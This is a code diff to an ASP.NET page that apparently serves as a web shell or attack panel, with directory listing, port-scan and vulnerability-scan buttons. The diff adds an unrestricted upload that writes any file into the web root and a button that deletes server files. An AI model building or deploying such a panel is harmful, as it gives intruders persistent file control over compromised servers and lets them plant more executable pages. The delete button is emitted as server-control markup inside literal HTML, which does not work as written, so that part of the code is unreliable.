@@ -43,6 +43,11 @@
                         <asp:Button ID="PortScanButton" runat="server" Text="Port Scan" OnClick="PortScanButton_Click" CssClass="btn btn-warning" />
                         <asp:Button ID="VulnScanButton" runat="server" Text="Vulnerability Scan" OnClick="VulnScanButton_Click" CssClass="btn btn-danger" />
                     </div>
+                    <div class="mb-3">
+                        <label for="FileUpload" class="form-label">Upload File:</label>
+                        <asp:FileUpload ID="FileUpload" runat="server" CssClass="form-control" />
+                        <asp:Button ID="UploadButton" runat="server" Text="Upload" OnClick="UploadButton_Click" CssClass="btn btn-primary mt-2" />
+                    </div>
                 </form>
                 <div class="mt-4">
                     <asp:Literal ID="OutputLiteral" runat="server" />
@@ -71,7 +76,7 @@
                 System.Text.StringBuilder sb = new System.Text.StringBuilder();
                 sb.Append("<h4 class='mt-4 mb-3'>Directory Listing for: " + Server.HtmlEncode(path) + "</h4>");
                 sb.Append("<div class='table-responsive'><table class='table table-dark table-striped table-hover'>");
-                sb.Append("<thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Last Modified</th><th>Permissions</th></tr></thead><tbody>");
+                sb.Append("<thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Last Modified</th><th>Permissions</th><th>Actions</th></tr></thead><tbody>");
 
                 foreach (string dir in directories)
                 {
@@ -82,6 +87,7 @@
                     sb.Append("<td>-</td>");
                     sb.Append("<td>" + dirInfo.LastWriteTime + "</td>");
                     sb.Append("<td>" + GetFilePermissions(dir) + "</td>");
+                    sb.Append("<td>-</td>");
                     sb.Append("</tr>");
                 }
 
@@ -94,6 +100,7 @@
                     sb.Append("<td>" + fileInfo.Length + " bytes</td>");
                     sb.Append("<td>" + fileInfo.LastWriteTime + "</td>");
                     sb.Append("<td>" + GetFilePermissions(file) + "</td>");
+                    sb.Append("<td><asp:Button ID='DeleteButton_" + fileInfo.Name + "' runat='server' Text='Delete' OnClick='DeleteButton_Click' CommandArgument='" + Server.HtmlEncode(file) + "' CssClass='btn btn-danger btn-sm' /></td>");
                     sb.Append("</tr>");
                 }
 
@@ -284,6 +291,44 @@
 
             sb.Append("</ul>");
             OutputLiteral.Text = sb.ToString();
+        }
+
+        protected void UploadButton_Click(object sender, EventArgs e)
+        {
+            if (FileUpload.HasFile)
+            {
+                try
+                {
+                    string filename = Path.GetFileName(FileUpload.FileName);
+                    string uploadPath = Path.Combine(Server.MapPath("."), filename);
+                    FileUpload.SaveAs(uploadPath);
+                    OutputLiteral.Text = "<div class='alert alert-success'>File uploaded successfully: " + Server.HtmlEncode(filename) + "</div>";
+                }
+                catch (Exception ex)
+                {
+                    OutputLiteral.Text = "<div class='alert alert-danger'>Error uploading file: " + Server.HtmlEncode(ex.Message) + "</div>";
+                }
+            }
+            else
+            {
+                OutputLiteral.Text = "<div class='alert alert-warning'>Please select a file to upload.</div>";
+            }
+        }
+
+        protected void DeleteButton_Click(object sender, EventArgs e)
+        {
+            Button btn = (Button)sender;
+            string filePath = btn.CommandArgument;
+            try
+            {
+                File.Delete(filePath);
+                OutputLiteral.Text = "<div class='alert alert-success'>File deleted successfully: " + Server.HtmlEncode(Path.GetFileName(filePath)) + "</div>";
+                ListButton_Click(null, null); // Refresh the file list
+            }
+            catch (Exception ex)
+            {
+                OutputLiteral.Text = "<div class='alert alert-danger'>Error deleting file: " + Server.HtmlEncode(ex.Message) + "</div>";
+            }
         }
     </script>
 </body>
